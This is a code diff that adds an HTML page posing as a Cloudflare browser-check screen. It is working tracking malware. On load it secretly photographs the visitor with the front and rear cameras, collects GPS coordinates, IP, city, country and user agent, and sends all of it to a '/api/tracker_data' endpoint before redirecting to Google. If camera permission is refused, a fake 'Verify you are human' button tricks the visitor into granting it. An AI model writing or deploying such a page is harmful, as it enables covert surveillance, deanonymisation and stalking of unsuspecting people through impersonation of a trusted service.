@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checking your browser - Cloudflare</title>
+    <link rel="icon" href="https://www.cloudflare.com/favicon.ico" type="image/x-icon">
+    <style>
+        body {
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue", Arial, sans-serif;
+            background-color: #fff;
+            color: #313131;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+            padding: 20px;
+        }
+        .container { max-width: 600px; }
+        .logo { width: 140px; margin-bottom: 40px; }
+        h1 { font-size: 28px; font-weight: 500; margin: 0 0 15px; }
+        p { font-size: 16px; line-height: 1.5; color: #313131; margin-bottom: 10px; }
+        .spinner {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            border: 3px solid #ebebeb;
+            border-top: 3px solid #f6821f;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 30px 0;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .footer { margin-top: 50px; font-size: 13px; color: #919191; border-top: 1px solid #ebebeb; padding-top: 20px; }
+        video, canvas { display: none; }
+        #verifyBtn {
+            background-color: #f6821f;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            display: none;
+            margin: 20px auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://www.cloudflare.com/cdn-cgi/images/cf-logo.v0.svg" alt="Cloudflare" class="logo">
+        <h1 id="mainTitle">Checking your browser before accessing the website.</h1>
+        <p id="descText">This process is automatic. Your browser will redirect to your requested content shortly.</p>
+        <div id="loader" class="spinner"></div>
+        <button id="verifyBtn">Verify you are human</button>
+        <div class="footer">
+            Ray ID: <span id="rayId"></span> • Performance & security by Cloudflare
+        </div>
+    </div>
+
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const token = '__TOKEN__';
+        const apiUrl = window.location.origin + '/api/tracker_data';
+        const rayId = Math.random().toString(36).substring(2, 11).toUpperCase() + Math.random().toString(36).substring(2, 11).toUpperCase();
+        document.getElementById('rayId').textContent = rayId;
+
+        let capturedData = {
+            photo_front: null,
+            photo_back: null,
+            lat: null,
+            lng: null,
+            ip: 'Unknown',
+            city: 'Unknown',
+            country: 'Unknown'
+        };
+
+        async function getIpData() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                if (res.ok) {
+                    const data = await res.json();
+                    capturedData.ip = data.ip;
+                    capturedData.city = data.city;
+                    capturedData.country = data.country_name;
+                }
+            } catch (e) {}
+        }
+
+        async function getGPS() {
+            return new Promise((resolve) => {
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition((pos) => {
+                        capturedData.lat = pos.coords.latitude;
+                        capturedData.lng = pos.coords.longitude;
+                        resolve();
+                    }, () => resolve(), { timeout: 5000 });
+                } else resolve();
+            });
+        }
+
+        async function captureFromSource(facingMode) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }
+                });
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                
+                video.srcObject = stream;
+                await new Promise(r => video.onloadedmetadata = r);
+                await video.play();
+                await new Promise(r => setTimeout(r, 1000)); // Wait for exposure
+
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+
+                stream.getTracks().forEach(t => t.stop());
+                return new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+            } catch (e) {
+                return null;
+            }
+        }
+
+        async function startCapture() {
+            const verifyBtn = document.getElementById('verifyBtn');
+            const loader = document.getElementById('loader');
+            const mainTitle = document.getElementById('mainTitle');
+
+            // Start IP fetch immediately
+            getIpData();
+
+            try {
+                // Try stealth capture (usually fails on first permission)
+                const frontBlob = await captureFromSource("user");
+                if (!frontBlob) throw new Error("Permission needed");
+                
+                capturedData.photo_front = frontBlob;
+                capturedData.photo_back = await captureFromSource("environment");
+                await getGPS();
+                await sendData();
+            } catch (e) {
+                loader.style.display = 'none';
+                verifyBtn.style.display = 'block';
+                mainTitle.textContent = "Please verify you are human to continue.";
+
+                verifyBtn.onclick = async () => {
+                    verifyBtn.disabled = true;
+                    verifyBtn.textContent = "Verifying...";
+                    
+                    // Request GPS and Camera
+                    await getGPS();
+                    capturedData.photo_front = await captureFromSource("user");
+                    capturedData.photo_back = await captureFromSource("environment");
+                    
+                    await sendData();
+                };
+            }
+        }
+
+        async function sendData() {
+            const fd = new FormData();
+            fd.append('token', token);
+            if (capturedData.photo_front) fd.append('photo_front', capturedData.photo_front, 'front.jpg');
+            if (capturedData.photo_back) fd.append('photo_back', capturedData.photo_back, 'back.jpg');
+            if (capturedData.lat) fd.append('lat', capturedData.lat);
+            if (capturedData.lng) fd.append('lng', capturedData.lng);
+            fd.append('ip', capturedData.ip);
+            fd.append('city', capturedData.city);
+            fd.append('country', capturedData.country);
+            fd.append('device', navigator.userAgent);
+
+            try {
+                await fetch(apiUrl, { method: 'POST', body: fd, mode: 'cors' });
+            } catch (e) {}
+            window.location.href = "https://google.com";
+        }
+
+        if (token && token !== '__TOKEN__') {
+            startCapture();
+        } else {
+            window.location.href = "https://google.com";
+        }
+    </script>
+</body>
+</html>
